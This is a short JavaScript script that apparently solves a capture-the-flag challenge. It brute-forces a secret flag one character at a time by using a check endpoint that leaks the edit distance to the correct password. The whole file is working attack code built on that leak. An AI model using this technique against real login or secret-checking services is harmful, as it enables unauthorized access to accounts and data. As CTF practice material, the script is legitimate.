const ALLOWED_SYMBOLS = '0123456789abcdefghijklmnopqrstuvwxyz';
const START = '{flag_';
const END = '}';
const FILLER = '_';


async function test(password) {
    const response = await fetch('https://6ffbbfb0982fbecb.ctf-2026.ilovefrontend.ru/check', {
        method: 'POST',
        body: JSON.stringify({password}),
    });
    const data = await response.json();
    return data.distance ?? 0;
}

function replaceAt(string, index, char) {
    return string.substring(0, index) + char + string.substring(index + 1);
}

async function guessFlag() {
    const flagLength = await test('');
    const fillerLength = flagLength - START.length - END.length;
    let guess = START + FILLER.repeat(fillerLength) + END;
    let diff = await test(guess);

    for (let i = START.length; i < flagLength - END.length; i++) {
        for (let char = 0; char < ALLOWED_SYMBOLS.length; char++) {
            const currentGuess = replaceAt(guess, i, ALLOWED_SYMBOLS[char]);
            const currentDiff = await test(currentGuess);
            if (currentDiff < diff) {
                diff = currentDiff;
                guess = currentGuess;
                break;
            }
        }
    }

    return guess;
}

guessFlag().then(console.log)